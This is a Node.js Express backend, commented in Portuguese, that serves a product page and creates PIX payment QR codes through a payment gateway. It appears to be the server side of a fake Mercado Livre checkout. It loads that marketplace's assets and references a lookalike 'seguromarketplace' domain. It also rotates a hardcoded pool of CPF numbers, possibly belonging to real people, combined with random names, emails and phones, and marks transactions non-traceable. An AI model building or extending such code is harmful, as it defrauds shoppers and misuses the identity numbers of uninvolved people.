import 'dotenv/config';
import dns from 'dns';
import express from 'express';
import cors from 'cors';
import helmet from 'helmet';
import morgan from 'morgan';
import path from 'path';
import { fileURLToPath } from 'url';
import axios from 'axios';
// import { createPixTransaction } from './umbrellapagClient.js'; // REMOVIDO - usando edge function agora

// Para usar __dirname em ES modules
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Prioriza IPv4 para evitar problemas de conectividade em ambientes com IPv6
try {
  dns.setDefaultResultOrder('ipv4first');
} catch (_) {}

const app = express();

// Armazenamento temporário em memória para a forma de entrega escolhida
// Em produção, considere usar banco de dados ou Redis
const entregaStorage = new Map();

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'", "https://cdnjs.cloudflare.com", "https://http2.mlstatic.com"],
      styleSrc: ["'self'", "'unsafe-inline'", "https://http2.mlstatic.com"],
      fontSrc: ["'self'", "https://http2.mlstatic.com", "data:"],
      imgSrc: ["'self'", "data:", "https:", "http:"],
      connectSrc: ["'self'", "http://localhost:3000", "http://localhost:3001", "http://127.0.0.1:3000", "http://127.0.0.1:3001"],
    },
  },
}));
app.use(cors({
  origin: ['http://localhost:3000', 'http://127.0.0.1:3000', 'http://localhost:3001', 'http://127.0.0.1:3001'],
  credentials: true
}));
app.use(express.json({ limit: '1mb' }));
app.use(morgan('dev'));

// Servir arquivos estáticos do frontend
const frontendPath = path.join(__dirname, '..', '..', 'frontend');

// Rota específica para /produto (DEVE VIR ANTES do express.static)
app.get('/produto', (req, res) => {
  res.sendFile(path.join(frontendPath, 'page.html'), (err) => {
    if (err) {
      console.error('Erro ao servir page.html:', err);
      res.status(404).json({ error: true, message: 'Page not found' });
    }
  });
});

// Rota específica para /page.html (compatibilidade - DEVE VIR ANTES do express.static)
app.get('/page.html', (req, res) => {
  res.sendFile(path.join(frontendPath, 'page.html'), (err) => {
    if (err) {
      console.error('Erro ao servir page.html:', err);
      res.status(404).json({ error: true, message: 'Page not found' });
    }
  });
});

// Servir arquivos estáticos do frontend (DEVE VIR DEPOIS das rotas específicas)
app.use(express.static(frontendPath));

// Middleware para tratar erros de JSON malformado
app.use((err, req, res, next) => {
  if (err instanceof SyntaxError && err.status === 400 && 'body' in err) {
    console.error('❌ Erro ao parsear JSON:', {
      message: err.message,
      stack: err.stack,
      rawBody: req.body ? JSON.stringify(req.body).substring(0, 200) : 'vazio',
    });
    return res.status(400).json({ 
      error: true,
      message: 'JSON malformado na requisição',
      details: err.message,
      position: (err.message.match(/position (\d+)/) && err.message.match(/position (\d+)/)[1]) || 'desconhecido',
    });
  }
  next();
});

app.get('/health', (req, res) => {
  res.json({ ok: true, uptime: process.uptime() });
});

// Pool de CPFs para rotação
const CPF_POOL = [
  "45920621320", "45920710268", "45921075191", "45921270300", "45921660353",
  "45921776300", "45922071220", "08686768709", "17330410799", "07417952720",
  "04210889660", "46312218287", "46312285200", "45920252880", "46312480259",
  "46529268200", "45920222115", "45920222549", "45920435291", "44876319391",
  "44877135871", "44876807272", "44877447253", "44877463372", "44877676287",
  "44877170359", "44877331387", "44877420215", "45143331315", "45369526249",
  "45144338372", "45144605168", "45145032315", "45145326300", "45321957304",
  "45322325387", "44804067353", "44804440097", "44802528515", "44802930860",
  "44803125368", "44803214387", "44803303134", "44803702349", "44805106808",
  "44805277882", "44806345334", "44807120387", "44807988387", "44810304884",
  "44810406881", "44811098315", "44809646300", "44811390130", "44813031315",
  "44810752879", "44811063520", "44801971334", "44754043391", "45633428315",
  "44719221300", "45318204287", "45318395104", "44869479400", "44870973200",
  "45321710325", "44733372272", "44771886504", "45578117368", "44733690215",
  "45562199220", "46466142353", "46467084349", "44757905149", "44811640349",
  "46467106253"
];

let cpfIndex = 0;

// Função para obter próximo CPF (rotação)
function getNextCpf() {
  const cpf = CPF_POOL[cpfIndex];
  cpfIndex = (cpfIndex + 1) % CPF_POOL.length;
  return cpf;
}

// Função para gerar nome aleatório
function generateRandomName() {
  const firstNames = ['João', 'Maria', 'Pedro', 'Ana', 'Carlos', 'Julia', 'Lucas', 'Fernanda', 'Rafael', 'Mariana', 'Gabriel', 'Beatriz', 'Rodrigo', 'Camila', 'Thiago', 'Larissa'];
  const lastNames = ['Silva', 'Santos', 'Oliveira', 'Souza', 'Pereira', 'Costa', 'Rodrigues', 'Almeida', 'Nascimento', 'Lima', 'Araújo', 'Ferreira', 'Ribeiro', 'Carvalho', 'Gomes', 'Martins'];
  return `${firstNames[Math.floor(Math.random() * firstNames.length)]} ${lastNames[Math.floor(Math.random() * lastNames.length)]}`;
}

// Função para gerar email aleatório
function generateRandomEmail() {
  const domains = ['gmail.com', 'hotmail.com', 'yahoo.com.br', 'outlook.com', 'uol.com.br'];
  const names = ['user', 'cliente', 'teste', 'pessoa', 'contato', 'email'];
  const random = Math.floor(Math.random() * 10000);
  const domain = domains[Math.floor(Math.random() * domains.length)];
  const name = names[Math.floor(Math.random() * names.length)];
  return `${name}${random}@${domain}`;
}

// Função para gerar telefone aleatório
function generateRandomPhone() {
  const ddd = ['11', '21', '31', '41', '47', '48', '51', '61', '71', '81', '85'];
  const randomDdd = ddd[Math.floor(Math.random() * ddd.length)];
  const number = Math.floor(100000000 + Math.random() * 900000000);
  return `${randomDdd}${number}`;
}

// Rota para gerar QR Code PIX diretamente
app.post('/pix', async (req, res) => {
  try {
    console.log('\n' + '='.repeat(70));
    console.log('📥 Requisição recebida:', JSON.stringify(req.body, null, 2));
    
    const UMBRELLA_API_URL = "https://api-gateway.umbrellapag.com/api/user/transactions";
    const UMBRELLA_TOKEN = process.env.UMBRELLAPAG_API_KEY;
    
    if (!UMBRELLA_TOKEN) {
      return res.status(400).json({
        success: false,
        error: "Missing UMBRELLAPAG_API_KEY in environment variables."
      });
    }

    const { amount } = req.body;
    
    // Validações
    if (!amount || amount < 1) {
      return res.status(400).json({
        success: false,
        error: 'Invalid amount (minimum 1.00).'
      });
    }

    // Validação de valor máximo (R$ 3.000,00 conforme erro da API)
    if (amount > 3000) {
      return res.status(400).json({
        success: false,
        error: 'O valor máximo permitido para transações é de R$ 3.000,00.'
      });
    }
    
    // Gera dados aleatórios automaticamente (rotação de CPF)
    const name = req.body.name || generateRandomName();
    const email = req.body.email || generateRandomEmail();
    const document = req.body.document || getNextCpf();
    const phone = req.body.phone || generateRandomPhone();
    
    console.log('📋 Dados gerados:', { name, email, document, phone });

    // Processamento
    const amountInCents = Math.round(amount * 100);
    let clientIp = req.ip || req.headers['x-forwarded-for'] || "127.0.0.1";
    
    // Converte IPv6 para IPv4 se necessário
    if (clientIp.includes('::ffff:')) {
      clientIp = clientIp.replace('::ffff:', '');
    }
    if (clientIp.includes(',')) {
      clientIp = clientIp.split(',')[0].trim();
    }
    
    const documentClean = document.replace(/\D/g, '');
    if (documentClean.length !== 11 && documentClean.length !== 14) {
      return res.status(400).json({
        success: false,
        error: 'Documento inválido: deve ter 11 (CPF) ou 14 (CNPJ) dígitos'
      });
    }
    
    const documentType = documentClean.length === 11 ? 'CPF' : 'CNPJ';
    
    let phoneClean = phone ? phone.replace(/\D/g, '') : '11999999999';
    if (phoneClean.length < 10 || phoneClean.length > 11) {
      phoneClean = '11999999999';
    }

    // Payload - conforme documentação oficial da API UmbrellaPag
    const externalRef = `tx_${Date.now()}_${Math.random().toString(36).substring(7)}`;
    
    const transactionPayload = {
      amount: amountInCents,
      currency: "BRL",
      paymentMethod: "PIX",
      installments: 1,
      traceable: false,
      ip: clientIp,
      postbackUrl: process.env.POSTBACK_URL || "https://webhook.site/unique-id", // OBRIGATÓRIO
      metadata: JSON.stringify({
        source: "pix_qrcode_generator",
        timestamp: new Date().toISOString()
      }), // OBRIGATÓRIO
      customer: {
        name: name,
        email: email,
        phone: phoneClean,
        externalRef: externalRef, // OBRIGATÓRIO
        document: {
          type: documentType,
          number: documentClean
        },
        address: {
          zipCode: "01001000",
          street: "Praça da Sé",
          streetNumber: "1",
          complement: "",
          neighborhood: "Sé",
          city: "São Paulo",
          state: "SP",
          country: "BR"
        }
      },
      items: [
        {
          title: "Pagamento PIX",
          unitPrice: amountInCents,
          quantity: 1,
          tangible: false,
          externalRef: externalRef
        }
      ],
      pix: {
        expiresInDays: 1
      }
    };

    console.log('📤 Payload para UmbrellaPag:', JSON.stringify(transactionPayload, null, 2));
    console.log('🌐 Fazendo requisição para:', UMBRELLA_API_URL);

    // Chama API UmbrellaPag usando axios com retry em caso de timeout
    let umbrellaRes;
    const maxRetries = 2;
    let lastError = null;
    
    try {
      for (let attempt = 0; attempt <= maxRetries; attempt++) {
        try {
          if (attempt > 0) {
            console.log(`🔄 Tentativa ${attempt + 1}/${maxRetries + 1}...`);
            // Aguarda um pouco antes de tentar novamente
            await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
          }
          
          console.log(`📡 Tentativa ${attempt + 1}: Enviando requisição...`);
          umbrellaRes = await axios.post(UMBRELLA_API_URL, transactionPayload, {
            headers: {
              'Content-Type': 'application/json',
              'x-api-key': UMBRELLA_TOKEN,
              'User-Agent': 'UMBRELLAB2B/1.0'
            },
            timeout: 60000 // 60 segundos (aumentado de 30)
          });
          
          // Se chegou aqui, deu certo
          break;
        } catch (error) {
          lastError = error;
          
          // Se não for timeout, não tenta novamente
          if (error.code !== 'ECONNABORTED' && !error.message.includes('timeout') && error.code !== 'ETIMEDOUT') {
            // Se for erro de resposta HTTP, trata e retorna
            if (error.response) {
              console.log(`📥 Status da API: ${error.response.status} ${error.response.statusText}`);
              console.log('📥 Resposta da API (erro):', JSON.stringify(error.response.data));
              const umbrellaData = error.response.data;
              const errorMsg = (umbrellaData && umbrellaData.message) || (umbrellaData && umbrellaData.error) || JSON.stringify(umbrellaData);
              const refusedReason = (umbrellaData && umbrellaData.error && umbrellaData.error.refusedReason) || (umbrellaData && umbrellaData.refusedReason) || '';
              
              return res.status(400).json({
                success: false,
                error: refusedReason || errorMsg,
                details: {
                  status: (umbrellaData && umbrellaData.status),
                  message: (umbrellaData && umbrellaData.message),
                  refusedReason: refusedReason,
                  provider: (umbrellaData && umbrellaData.error && umbrellaData.error.provider)
                }
              });
            }
            // Outros erros não relacionados a timeout - retorna erro
            return res.status(500).json({
              success: false,
              error: 'Erro ao conectar com a API UmbrellaPag.',
              details: {
                code: error.code,
                message: error.message
              }
            });
          }
          
          // Se for timeout e ainda tem tentativas, continua o loop
          if (attempt < maxRetries) {
            console.log(`⏱️ Timeout na tentativa ${attempt + 1}, tentando novamente...`);
            continue;
          }
          
          // Se esgotou as tentativas, retorna erro
          return res.status(504).json({
            success: false,
            error: 'Timeout ao conectar com a API UmbrellaPag após várias tentativas. Tente novamente em alguns instantes.',
            details: {
              attempts: maxRetries + 1,
              lastError: error.message || error.code
            }
          });
        }
      }
      
      // Se chegou aqui mas não tem resposta, algo deu errado
      if (!umbrellaRes) {
        return res.status(500).json({
          success: false,
          error: 'Erro inesperado ao conectar com a API UmbrellaPag.',
          details: lastError ? lastError.message : 'Unknown error'
        });
      }
    } catch (error) {
      // Catch final para qualquer erro não tratado
      console.error('❌ Erro inesperado na requisição:', error);
      return res.status(500).json({
        success: false,
        error: 'Erro inesperado ao processar requisição.',
        details: error.message
      });
    }
    
    // Tratar erros de resposta HTTP (4xx, 5xx)
    if (umbrellaRes.status >= 400) {
      const umbrellaData = umbrellaRes.data;
      const errorMsg = (umbrellaData && umbrellaData.message) || (umbrellaData && umbrellaData.error) || JSON.stringify(umbrellaData);
      const refusedReason = (umbrellaData && umbrellaData.error && umbrellaData.error.refusedReason) || (umbrellaData && umbrellaData.refusedReason) || '';
      
      return res.status(400).json({
        success: false,
        error: refusedReason || errorMsg,
        details: {
          status: (umbrellaData && umbrellaData.status),
          message: (umbrellaData && umbrellaData.message),
          refusedReason: refusedReason,
          provider: (umbrellaData && umbrellaData.error && umbrellaData.error.provider)
        }
      });
    }

    console.log(`📥 Status da API: ${umbrellaRes.status} ${umbrellaRes.statusText}`);
    console.log('📥 Resposta da API:', JSON.stringify(umbrellaRes.data));

    const umbrellaData = umbrellaRes.data;

    // Verificar se a resposta indica erro (mesmo com status 200, pode ter erro no body)
    if (umbrellaRes.status >= 400 || (umbrellaData && umbrellaData.status && umbrellaData.status >= 400)) {
      const errorMsg = (umbrellaData && umbrellaData.message) || (umbrellaData && umbrellaData.error) || JSON.stringify(umbrellaData);
      const refusedReason = (umbrellaData && umbrellaData.error && umbrellaData.error.refusedReason) || (umbrellaData && umbrellaData.refusedReason) || '';
      
      return res.status(400).json({
        success: false,
        error: refusedReason || errorMsg,
        details: {
          status: (umbrellaData && umbrellaData.status),
          message: (umbrellaData && umbrellaData.message),
          refusedReason: refusedReason,
          provider: (umbrellaData && umbrellaData.error && umbrellaData.error.provider)
        }
      });
    }

    // Extrai QR Code
    const transactionId = (umbrellaData.data && umbrellaData.data.id) || umbrellaData.id;
    const pixData = (umbrellaData.data && umbrellaData.data.pix) || (umbrellaData.pix) || {};
    const paymentData = umbrellaData.data || umbrellaData;
    
    const pixCode = paymentData.qrCode || 
                    pixData.qrcode || 
                    pixData.qrCode || 
                    pixData.copiaECola || 
                    pixData.pixCopyPaste ||
                    (paymentData.pix && paymentData.pix.qrcode) ||
                    (paymentData.pix && paymentData.pix.qrCode);

    console.log('✅ QR Code extraído:', pixCode ? `${pixCode.substring(0, 50)}...` : 'NÃO ENCONTRADO');

    if (!transactionId) {
      return res.status(500).json({
        success: false,
        error: "Success response received but missing Transaction ID."
      });
    }

    if (!pixCode) {
      return res.status(500).json({
        success: false,
        error: "Success response received but missing PIX QR Code.",
        debug: umbrellaData
      });
    }

    // Resposta de sucesso
    const response = {
      success: true,
      transactionId: transactionId,
      pixCode: pixCode,
      pix_copy_paste: pixCode,
      amount: amountInCents,
      amountBRL: amount,
      status: 'pending',
      ...(pixData.expirationDate && { expirationDate: pixData.expirationDate }),
      ...(pixData.chave && { pixKey: pixData.chave })
    };

    console.log('✅ Resposta enviada:', JSON.stringify(response, null, 2));
    console.log('='.repeat(70) + '\n');

    res.json(response);

  } catch (error) {
    console.error('❌ Erro:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Create PIX transaction (proxy)
// DESABILITADO - Agora usando edge function (umbrella-deposit-edge-function.js)
/*
app.post('/pix', async (req, res) => {
  try {
    console.log('📥 POST /pix recebido:', JSON.stringify(req.body, null, 2));
    
    const { code, amount, email, document, url, hostname } = req.body || {};
    if (!code || amount == null || !email || !document || !url) {
      console.error('❌ Campos obrigatórios faltando:', { code, amount, email, document, url });
      return res.status(400).json({ 
        error: true,
        message: 'Missing required fields: code, amount, email, document, url',
        received: { code, amount, email, document, url }
      });
    }

    // Extrai hostname da URL se não fornecido
    let finalHostname = hostname;
    
    // Remove protocolo (http:// ou https://) se presente
    if (finalHostname) {
      finalHostname = finalHostname.replace(/^https?:\/\//, '').replace(/\/$/, '');
    }
    
    if (!finalHostname && url) {
      try {
        const urlObj = new URL(url);
        finalHostname = urlObj.hostname;
        // Se for localhost, não usa (API não aceita)
        if (finalHostname === 'localhost' || finalHostname === '127.0.0.1') {
          finalHostname = null;
        }
      } catch (e) {
        finalHostname = null;
      }
    }

    // Se ainda não tiver hostname válido, usa o configurado no .env
    if (!finalHostname) {
      finalHostname = process.env.UMBRELLAPAG_HOSTNAME || null;
      if (finalHostname) {
        // Remove protocolo também do .env se presente
        finalHostname = finalHostname.replace(/^https?:\/\//, '').replace(/\/$/, '');
      }
    }
    
    // Valida se tem hostname antes de continuar
    if (!finalHostname) {
      return res.status(400).json({
        error: true,
        message: 'Hostname é obrigatório. Forneça via parâmetro "hostname" no body ou configure UMBRELLAPAG_HOSTNAME no .env',
        hint: 'O hostname deve ser apenas o domínio (ex: app.umbrellapag.com), sem http:// ou https://',
      });
    }

    const payload = { code, amount, email, document, url, hostname: finalHostname };
    console.log('🔄 Processando payload:', payload);
    console.log('🌐 Hostname extraído:', finalHostname);
    
    const response = await createPixTransaction(payload);
    console.log('✅ Resposta enviada ao cliente:', response);
    
    return res.status(201).json(response);
  } catch (err) {
    const status = (err.response && err.response.status) || 500;
    const data = (err.response && err.response.data) || { message: err.message };
    // Log detailed provider error to help debugging
    console.error('❌ Erro no endpoint /pix:', {
      status,
      error: err.message,
      responseData: data,
      stack: err.stack,
    });
    return res.status(status).json({ error: true, ...data });
  }
});
*/

// Create PIX transaction via GET (parâmetros na URL)
// DESABILITADO - Agora usando edge function (umbrella-deposit-edge-function.js)
/*
app.get('/pix', async (req, res) => {
  try {
    console.log('📥 GET /pix recebido - Query params:', JSON.stringify(req.query, null, 2));
    
    // Extrai parâmetros da URL (query parameters)
    const { code, amount, email, document, url, hostname } = req.query || {};
    
    // Valida campos obrigatórios
    if (!code || !amount || !email || !document) {
      console.error('❌ Campos obrigatórios faltando:', { code, amount, email, document });
      return res.status(400).json({ 
        error: true,
        message: 'Missing required query parameters: code, amount, email, document',
        received: { code, amount, email, document },
        example: '/pix?code=TESTE123&amount=20&email=cliente@gmail.com&document=07444082456&url=http://localhost:3001/webhook/umbrellapag&hostname=app.umbrellapag.com'
      });
    }

    // Converte amount para número
    const amountNum = parseFloat(amount);
    if (isNaN(amountNum) || amountNum <= 0) {
      return res.status(400).json({
        error: true,
        message: 'Amount deve ser um número válido maior que zero',
        received: amount
      });
    }

    // URL do webhook (opcional, mas recomendado)
    const webhookUrl = url || `http://localhost:3001/webhook/umbrellapag`;

    // Extrai hostname da URL se não fornecido
    let finalHostname = hostname;
    
    // Remove protocolo (http:// ou https://) se presente
    if (finalHostname) {
      finalHostname = finalHostname.replace(/^https?:\/\//, '').replace(/\/$/, '');
    }
    
    if (!finalHostname && webhookUrl) {
      try {
        const urlObj = new URL(webhookUrl);
        finalHostname = urlObj.hostname;
        // Se for localhost, não usa (API não aceita)
        if (finalHostname === 'localhost' || finalHostname === '127.0.0.1') {
          finalHostname = null;
        }
      } catch (e) {
        finalHostname = null;
      }
    }
    
    // Se ainda não tiver hostname válido, usa o configurado no .env
    if (!finalHostname) {
      finalHostname = process.env.UMBRELLAPAG_HOSTNAME || null;
      if (finalHostname) {
        // Remove protocolo também do .env se presente
        finalHostname = finalHostname.replace(/^https?:\/\//, '').replace(/\/$/, '');
      }
    }
    
    // Valida se tem hostname antes de continuar
    if (!finalHostname) {
      return res.status(400).json({
        error: true,
        message: 'Hostname é obrigatório. Forneça via query parameter "hostname" ou configure UMBRELLAPAG_HOSTNAME no .env',
        hint: 'O hostname deve ser apenas o domínio (ex: app.umbrellapag.com), sem http:// ou https://',
        example: '/pix?code=TESTE123&amount=20&email=cliente@gmail.com&document=07444082456&hostname=app.umbrellapag.com'
      });
    }

    const payload = { 
      code, 
      amount: amountNum, 
      email, 
      document, 
      url: webhookUrl, 
      hostname: finalHostname 
    };
    
    console.log('🔄 Processando payload (GET):', payload);
    console.log('🌐 Hostname extraído:', finalHostname);
    
    const response = await createPixTransaction(payload);
    console.log('✅ Resposta enviada ao cliente (GET):', response);
    
    return res.status(200).json(response);
  } catch (err) {
    const status = (err.response && err.response.status) || 500;
    const data = (err.response && err.response.data) || { message: err.message };
    console.error('❌ Erro no endpoint GET /pix:', {
      status,
      error: err.message,
      responseData: data,
      stack: err.stack,
    });
    return res.status(status).json({ error: true, ...data });
  }
});
*/

// Rota simples: /:cliente/:produto/payment/:valor
// Exemplo: http://localhost:3001/cliente/produto/payment/20.99
// DESABILITADO - Agora usando edge function (umbrella-deposit-edge-function.js)
/*
app.get('/:cliente/:produto/payment/:valor', async (req, res) => {
  try {
    const { cliente, produto, valor } = req.params;
    
    // Se for requisição do navegador (não API), serve o HTML do frontend
    const acceptsJson = req.headers.accept && req.headers.accept.includes('application/json');
    if (!acceptsJson) {
      return res.sendFile(path.join(frontendPath, 'page.html'));
    }
    
    console.log('📥 GET /:cliente/:produto/payment/:valor recebido (API):', { cliente, produto, valor });
    
    // Converte valor para número
    const amountNum = parseFloat(valor);
    if (isNaN(amountNum) || amountNum <= 0) {
      return res.status(400).json({
        error: true,
        message: 'Valor deve ser um número válido maior que zero',
        received: valor
      });
    }

    // Gera dados automaticamente baseado no cliente e produto
    const code = `${cliente}_${produto}_${Date.now()}`;
    const email = `${cliente}@cliente.com`;
    const document = '07444082456'; // CPF padrão (pode ser configurável depois)
    
    // URL do webhook
    const isDev = req.hostname === 'localhost' || req.hostname === '127.0.0.1';
    const webhookUrl = isDev 
      ? `http://localhost:3001/webhook/umbrellapag`
      : `${req.protocol}://${req.get('host')}/webhook/umbrellapag`;

    // Extrai hostname
    let finalHostname = process.env.UMBRELLAPAG_HOSTNAME || null;
    if (finalHostname) {
      finalHostname = finalHostname.replace(/^https?:\/\//, '').replace(/\/$/, '');
    }
    
    // Se não tiver hostname configurado, tenta extrair da requisição
    if (!finalHostname && !isDev) {
      finalHostname = req.hostname;
      if (finalHostname === 'localhost' || finalHostname === '127.0.0.1') {
        finalHostname = null;
      }
    }
    
    // Em desenvolvimento, usa hostname padrão se não configurado
    if (!finalHostname && isDev) {
      finalHostname = process.env.UMBRELLAPAG_HOSTNAME || 'app.umbrellapag.com';
      console.log('⚠️ Usando hostname padrão para desenvolvimento:', finalHostname);
    }
    
    // Valida hostname
    if (!finalHostname) {
      return res.status(400).json({
        error: true,
        message: 'Hostname é obrigatório. Configure UMBRELLAPAG_HOSTNAME no .env',
        hint: 'O hostname deve ser apenas o domínio (ex: app.umbrellapag.com), sem http:// ou https://',
        example: 'Crie um arquivo .env na pasta backend/ com: UMBRELLAPAG_HOSTNAME=app.umbrellapag.com'
      });
    }

    const payload = {
      code,
      amount: amountNum,
      email,
      document,
      url: webhookUrl,
      hostname: finalHostname
    };
    
    console.log('🔄 Processando payload (rota simples):', payload);
    
    const response = await createPixTransaction(payload);
    console.log('✅ Resposta enviada ao cliente (rota simples):', response);
    
    return res.status(200).json(response);
  } catch (err) {
    const status = (err.response && err.response.status) || 500;
    const data = (err.response && err.response.data) || { message: err.message };
    console.error('❌ Erro no endpoint GET /:cliente/:produto/payment/:valor:', {
      status,
      error: err.message,
      responseData: data,
      stack: err.stack,
    });
    return res.status(status).json({ error: true, ...data });
  }
});
*/

// Rota simples alternativa: /:cliente/:produto?payment=valor
// Exemplo: http://localhost:3001/cliente/produto?payment=20.99
// DESABILITADO - Agora usando edge function (umbrella-deposit-edge-function.js)
/*
app.get('/:cliente/:produto', async (req, res) => {
  try {
    const { cliente, produto } = req.params;
    const { payment } = req.query;
    
    // Se for requisição do navegador (não API) e não tiver payment, serve o HTML
    const acceptsJson = req.headers.accept && req.headers.accept.includes('application/json');
    if (!acceptsJson && !payment) {
      return res.sendFile(path.join(frontendPath, 'page.html'));
    }
    
    console.log('📥 GET /:cliente/:produto recebido:', { cliente, produto, payment });
    
    // Valida payment (valor)
    if (!payment) {
      return res.status(400).json({
        error: true,
        message: 'Parâmetro "payment" é obrigatório',
        example: `/${cliente}/${produto}?payment=20.99`
      });
    }

    // Converte payment para número
    const amountNum = parseFloat(payment);
    if (isNaN(amountNum) || amountNum <= 0) {
      return res.status(400).json({
        error: true,
        message: 'Payment deve ser um número válido maior que zero',
        received: payment
      });
    }

    // Gera dados automaticamente baseado no cliente e produto
    const code = `${cliente}_${produto}_${Date.now()}`;
    const email = `${cliente}@cliente.com`;
    const document = '07444082456'; // CPF padrão (pode ser configurável depois)
    
    // URL do webhook
    const isDev = req.hostname === 'localhost' || req.hostname === '127.0.0.1';
    const webhookUrl = isDev 
      ? `http://localhost:3001/webhook/umbrellapag`
      : `${req.protocol}://${req.get('host')}/webhook/umbrellapag`;

    // Extrai hostname
    let finalHostname = process.env.UMBRELLAPAG_HOSTNAME || null;
    if (finalHostname) {
      finalHostname = finalHostname.replace(/^https?:\/\//, '').replace(/\/$/, '');
    }
    
    // Se não tiver hostname configurado, tenta extrair da requisição
    if (!finalHostname && !isDev) {
      finalHostname = req.hostname;
      if (finalHostname === 'localhost' || finalHostname === '127.0.0.1') {
        finalHostname = null;
      }
    }
    
    // Em desenvolvimento, usa hostname padrão se não configurado
    if (!finalHostname && isDev) {
      finalHostname = process.env.UMBRELLAPAG_HOSTNAME || 'app.umbrellapag.com';
      console.log('⚠️ Usando hostname padrão para desenvolvimento:', finalHostname);
    }
    
    // Valida hostname
    if (!finalHostname) {
      return res.status(400).json({
        error: true,
        message: 'Hostname é obrigatório. Configure UMBRELLAPAG_HOSTNAME no .env',
        hint: 'O hostname deve ser apenas o domínio (ex: app.umbrellapag.com), sem http:// ou https://',
        example: 'Crie um arquivo .env na pasta backend/ com: UMBRELLAPAG_HOSTNAME=app.umbrellapag.com'
      });
    }

    const payload = {
      code,
      amount: amountNum,
      email,
      document,
      url: webhookUrl,
      hostname: finalHostname
    };
    
    console.log('🔄 Processando payload (rota simples):', payload);
    
    const response = await createPixTransaction(payload);
    console.log('✅ Resposta enviada ao cliente (rota simples):', response);
    
    return res.status(200).json(response);
  } catch (err) {
    const status = (err.response && err.response.status) || 500;
    const data = (err.response && err.response.data) || { message: err.message };
    console.error('❌ Erro no endpoint GET /:cliente/:produto:', {
      status,
      error: err.message,
      responseData: data,
      stack: err.stack,
    });
    return res.status(status).json({ error: true, ...data });
  }
});
*/

// Endpoint para receber forma de entrega do Mercado Livre
// Compatível com: https://mercadolivre.seguromarketplace.com/api/4
// Este endpoint será chamado automaticamente pelo Mercado Livre quando o usuário escolher a forma de entrega
app.post('/api/4', async (req, res) => {
  try {
    // Log completo para debug
    console.log('POST /api/4 recebido:', JSON.stringify(req.body, null, 2));
    console.log('Headers:', JSON.stringify(req.headers, null, 2));
    
    const { forma_de_entrega_escolhida, valor_total, amount, order_id, session_id } = req.body;
    
    // Aceita valor_total ou amount
    const valorBase = valor_total || amount;
    
    // Usa order_id ou session_id como identificador, ou gera um timestamp
    const identificador = order_id || session_id || `default_${Date.now()}`;
    
    if (valorBase == null || valorBase === undefined) {
      return res.status(400).json({ 
        status: 'error', 
        message: 'Valor total não fornecido. É necessário fornecer valor_total ou amount.' 
      });
    }

    if (!forma_de_entrega_escolhida) {
      return res.status(400).json({ 
        status: 'error', 
        message: 'Nenhuma escolha de entrega recebida via POST.' 
      });
    }

    const valorNumerico = parseFloat(valorBase);
    if (isNaN(valorNumerico) || valorNumerico <= 0) {
      return res.status(400).json({ 
        status: 'error', 
        message: 'Valor total inválido.' 
      });
    }

    let valorFinal = valorNumerico;
    
    // Se forma_de_entrega_escolhida = 1, adiciona 12.90
    if (forma_de_entrega_escolhida === 1 || forma_de_entrega_escolhida === '1') {
      valorFinal = valorNumerico + 12.90;
    }
    // Se forma_de_entrega_escolhida = 2, mantém o preço normal (sem adicionar)

    // Armazena a escolha para o frontend consultar
    entregaStorage.set(identificador, {
      forma_de_entrega_escolhida: forma_de_entrega_escolhida === 1 || forma_de_entrega_escolhida === '1' ? 1 : 2,
      valor_original: valorNumerico,
      valor_final: valorFinal,
      timestamp: Date.now()
    });

    // Limpa entradas antigas (mais de 1 hora)
    const umaHora = 60 * 60 * 1000;
    for (const [key, value] of entregaStorage.entries()) {
      if (Date.now() - value.timestamp > umaHora) {
        entregaStorage.delete(key);
      }
    }

    console.log('Forma de entrega processada:', {
      identificador,
      forma_de_entrega_escolhida,
      valor_original: valorNumerico,
      valor_final: valorFinal
    });

    return res.status(200).json({
      status: 'success',
      forma_de_entrega_escolhida,
      valor_original: valorNumerico,
      valor_final: valorFinal,
      taxa_entrega: forma_de_entrega_escolhida === 1 || forma_de_entrega_escolhida === '1' ? 12.90 : 0,
      identificador
    });
  } catch (err) {
    console.error('Erro ao processar forma de entrega:', err);
    return res.status(500).json({ 
      status: 'error', 
      message: 'Erro interno do servidor.' 
    });
  }
});

// Endpoint GET para o frontend consultar a última escolha de entrega
// Permite consultar por identificador ou pegar a mais recente
app.get('/api/4', async (req, res) => {
  try {
    const { identificador, order_id, session_id } = req.query;
    const key = identificador || order_id || session_id || 'default';
    
    // Busca a mais recente se não especificar
    let data = null;
    if (key !== 'default') {
      data = entregaStorage.get(key);
    } else {
      // Pega a entrada mais recente
      let maisRecente = null;
      let timestampMaisRecente = 0;
      for (const [k, v] of entregaStorage.entries()) {
        if (v.timestamp > timestampMaisRecente) {
          timestampMaisRecente = v.timestamp;
          maisRecente = { identificador: k, ...v };
        }
      }
      data = maisRecente;
    }
    
    if (!data) {
      return res.status(404).json({ 
        status: 'error', 
        message: 'Nenhuma escolha de entrega encontrada.' 
      });
    }
    
    return res.status(200).json({
      status: 'success',
      ...data
    });
  } catch (err) {
    console.error('Erro ao consultar forma de entrega:', err);
    return res.status(500).json({ 
      status: 'error', 
      message: 'Erro interno do servidor.' 
    });
  }
});

// Webhook receiver for UmbrellaPag
app.post('/webhook/umbrellapag', async (req, res) => {
  // You can add verification/signature validation here if provided by the provider
  const event = req.body;
  // For now, just log and return 200 so provider considers it delivered
  console.log('UmbrellaPag Webhook Received:', JSON.stringify(event, null, 2));
  return res.status(200).json({ received: true });
});

// Mantém compatibilidade com o endpoint antigo (Agilize)
app.post('/webhook/agilize', async (req, res) => {
  // Redireciona para o handler UmbrellaPag
  const event = req.body;
  console.log('Agilize Webhook (legacy) Received:', JSON.stringify(event, null, 2));
  return res.status(200).json({ received: true });
});

// Rota catch-all para servir o frontend (DEVE VIR POR ÚLTIMO - depois de todas as rotas de API)
// Serve page.html para qualquer rota que não seja API
// IMPORTANTE: Esta rota deve vir DEPOIS de todas as outras rotas GET
app.get('*', (req, res, next) => {
  // Se for uma rota de API conhecida, não serve o HTML (já foi tratada antes)
  if (req.path.startsWith('/api/') || 
      req.path === '/pix' || 
      req.path.startsWith('/webhook/') ||
      req.path === '/health') {
    return res.status(404).json({ error: true, message: 'Not found' });
  }
  
  // Serve o page.html para rotas do frontend (incluindo /cliente/produto/payment/valor)
